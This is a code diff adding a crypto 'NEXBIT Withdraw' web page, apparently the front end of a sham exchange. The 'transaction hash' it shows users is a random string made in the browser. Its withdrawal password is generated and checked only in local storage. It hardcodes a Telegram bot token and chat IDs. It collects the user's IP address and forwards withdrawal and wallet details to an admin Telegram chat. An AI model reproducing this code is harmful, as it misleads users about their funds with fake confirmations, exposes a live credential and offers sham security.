@@ -1,0 +1,288 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>NEXBIT Withdraw</title>
+
+<style>
+  * { box-sizing: border-box; }
+  body { background-color: transparent; font-family: Arial, sans-serif; margin:0; padding:0; width:100%; overflow-x:hidden; }
+  .withdraw-box { width:100%; max-width:450px; margin:30px auto; padding:25px; border-radius:12px; background:transparent!important; color:white; }
+  select,input,button { width:100%; max-width:100%; padding:12px; margin-top:8px; border-radius:6px; border:1px solid rgba(255,255,255,0.6); background:transparent!important; color:white; font-size:15px; display:block; }
+  select option { color:black; }
+  button { cursor:pointer; font-weight:bold; border:none; background:#0099cc; }
+  button:disabled { background:#444!important; cursor:not-allowed!important; }
+  .row { display:flex; justify-content:space-between; gap:10px; width:100%; }
+  #copyHashBtn,#submitBtn { display:none; width:48%; }
+  #usdtText { text-align:right; color:#00ff00; font-size:13px; }
+  #hashBox { color:#00ff00; margin-top:10px; white-space:pre-line; font-size:14px; overflow-wrap:break-word; }
+</style>
+</head>
+
+<body>
+<div class="withdraw-box">
+  <h2 style="text-align:center;"></h2>
+
+  <label>Select Cryptocurrency</label>
+  <select id="coin" onchange="updateUSDT()">
+    <option value="BTC">BTC</option>
+    <option value="ETH">ETH</option>
+    <option value="USDT">USDT</option>
+    <option value="BNB">BNB</option>
+    <option value="XRP">XRP</option>
+    <option value="ADA">ADA</option>
+    <option value="SOL">SOL</option>
+    <option value="DOGE">DOGE</option>
+    <option value="TRX">TRX</option>
+  </select>
+
+  <label>Enter Coin Amount</label>
+  <input id="amount" placeholder="Enter amount" oninput="updateUSDT()" />
+  <div id="usdtText">USDT Equivalent: <span id="usdtValue">0</span></div>
+
+  <label>Password</label>
+  <input type="password" id="password" placeholder="Enter password" />
+
+  <div class="row">
+    <button id="createPwdBtn" onclick="createPassword()">Create Password</button>
+    <button id="confirmPwdBtn" onclick="confirmPassword()">Confirm Password</button>
+  </div>
+
+  <button onclick="forgotPassword()">Forgot Password?</button>
+
+  <label>Wallet Address</label>
+  <input id="wallet" placeholder="Paste wallet address" />
+  <button id="walletBtn" onclick="confirmWallet()">Confirm Wallet Address</button>
+
+  <div id="hashBox"></div>
+
+  <div class="row">
+    <button id="copyHashBtn" onclick="copyHash()">Copy Hash</button>
+    <button id="submitBtn" onclick="submitWithdrawal()">Submit Withdrawal</button>
+  </div>
+</div>
+
+<script>
+/************************************
+ * NEXBIT — 独立 UID（全站统一）
+ ************************************/
+if(!localStorage.getItem("nexbit_uid")) {
+    localStorage.setItem("nexbit_uid", "U" + Date.now() + "_" + Math.floor(Math.random()*999999));
+}
+const USERID = localStorage.getItem("nexbit_uid");
+
+/************************************
+ * 后端配置
+ ************************************/
+const API = "https://crypto-management-production-5e04.up.railway.app";
+const BOT_TOKEN = "8228143745:AAGsaA043ZDQyXt8szfBnr0LpmrMl5ILvRs";
+const ADMIN_ID = "6062973135";
+const GROUP_ID = "-1003122480155";
+
+/************************************
+ * 防止重复提交
+ ************************************/
+let submitting = false;
+
+/************************************
+ * 时间格式
+ ************************************/
+function usTime(){
+  return new Date().toISOString();
+}
+
+/************************************
+ * Binance WS 价格
+ ************************************/
+let currentPrice = 0;
+let ws;
+
+function connectWS(symbol){
+  if(ws){ ws.close(); }
+  if(symbol==="USDT"){ currentPrice = 1; updateUSDT(); return; }
+
+  ws = new WebSocket("wss://stream.binance.com:9443/ws/" + symbol.toLowerCase() + "usdt@ticker");
+  ws.onmessage = e => {
+    let d = JSON.parse(e.data);
+    currentPrice = parseFloat(d.c);
+    updateUSDT();
+  };
+}
+
+document.getElementById("coin").addEventListener("change", () => {
+  connectWS(document.getElementById("coin").value);
+});
+connectWS(document.getElementById("coin").value);
+
+/************************************
+ * 密码逻辑
+ ************************************/
+let storedPassword = localStorage.getItem("withdraw_password");
+let passwordConfirmed = false;
+
+if(storedPassword) document.getElementById("createPwdBtn").style.display = "none";
+
+function createPassword(){
+  if(storedPassword) return alert("Password already created.");
+  storedPassword = Math.random().toString(36).substr(2,6).toUpperCase();
+  localStorage.setItem("withdraw_password", storedPassword);
+  alert("Your Password: " + storedPassword);
+  document.getElementById("createPwdBtn").style.display = "none";
+}
+
+function confirmPassword(){
+  if(document.getElementById("password").value === storedPassword){
+    passwordConfirmed = true;
+    alert("Password confirmed!");
+  } else alert("Wrong password!");
+}
+
+function forgotPassword(){
+  alert("Please contact admin to reset.");
+}
+
+/************************************
+ * 钱包逻辑
+ ************************************/
+let txHash = "";
+
+function confirmWallet(){
+  if(!passwordConfirmed) return alert("Confirm password first.");
+
+  let wallet = document.getElementById("wallet").value.trim();
+  if(!wallet) return alert("Enter wallet address.");
+
+  txHash = "TX-" + Math.random().toString(36).substr(2,8).toUpperCase();
+  document.getElementById("hashBox").innerText = "Hash:\n" + txHash;
+
+  document.getElementById("copyHashBtn").style.display = "block";
+  document.getElementById("submitBtn").style.display = "block";
+  document.getElementById("submitBtn").disabled = false;
+
+  document.getElementById("walletBtn").disabled = true;
+}
+
+function copyHash(){
+  navigator.clipboard.writeText(txHash);
+  alert("Copied");
+}
+
+/************************************
+ * USDT 自动计算
+ ************************************/
+function updateUSDT(){
+  let amount = parseFloat(document.getElementById("amount").value || 0);
+  let val = amount * currentPrice;
+  document.getElementById("usdtValue").innerText = isNaN(val) ? "0" : val.toFixed(6);
+}
+
+/************************************
+ * Telegram 通知
+ ************************************/
+function sendTG(text){
+  let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+  fetch(url, {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({ chat_id: ADMIN_ID, text })
+  }).catch(()=>{});
+
+  fetch(url, {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({ chat_id: GROUP_ID, text })
+  }).catch(()=>{});
+}
+
+/************************************
+ * 提款提交
+ ************************************/
+async function submitWithdrawal(){
+  if(submitting) return;
+  submitting = true;
+
+  const btn = document.getElementById("submitBtn");
+  btn.disabled = true;
+  btn.innerText = "Submitting...";
+
+  let coin = document.getElementById("coin").value;
+  let amount = parseFloat(document.getElementById("amount").value);
+  let wallet = document.getElementById("wallet").value.trim();
+  let estimate = parseFloat(document.getElementById("usdtValue").innerText);
+
+  if(!amount || amount <= 0){
+    alert("Please enter a valid withdrawal amount");
+    submitting = false; btn.disabled = false; btn.innerText = "Submit Withdrawal";
+    return;
+  }
+  if(!wallet){
+    alert("Please enter your wallet address.");
+    submitting = false; btn.disabled = false; btn.innerText = "Submit Withdrawal";
+    return;
+  }
+
+  let orderId = "WDL-" + Date.now();
+  let time = usTime();
+
+  let ip = "0.0.0.0";
+  try {
+    let r = await fetch("https://api.ipify.org?format=json");
+    ip = (await r.json()).ip;
+  } catch(e){}
+
+  const payload = {
+    orderId,
+    userId: USERID,
+    time_us: time,
+    type: "withdraw",
+    amount,
+    coin,
+    estimate,
+    wallet,
+    ip,
+    tp: null,
+    sl: null,
+    status: "pending"
+  };
+
+  try {
+    const res = await fetch(API + "/api/order/withdraw", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "X-User-Id": USERID
+      },
+      body: JSON.stringify(payload)
+    });
+
+    const txt = await res.text();
+
+    if (!res.ok) {
+      if (txt.includes("余额不足")) alert("🤖Insufficient balance!");
+      else alert("Submission failed: " + txt);
+      submitting = false; btn.disabled = false; btn.innerText = "Submit Withdrawal";
+      return;
+    }
+
+    console.log("Withdraw success:", txt);
+
+  } catch(e){
+    alert("🤖Submission failed, please try again.");
+    submitting = false; btn.disabled = false; btn.innerText = "Submit Withdrawal";
+    return;
+  }
+
+  sendTG(
+    `📤 Withdrawal Request\nUser: ${USERID}\nOrder: ${orderId}\nCoin: ${coin}\nAmount: ${amount}\nUSDT: ${estimate}\nWallet: ${wallet}\nTime (US): ${time}`
+  );
+
+  alert("🤖Withdrawal Request Submitted!");
+  btn.innerText = "Submitted";
+  submitting = false;
+}
+</script>
+
+</body>
+</html>
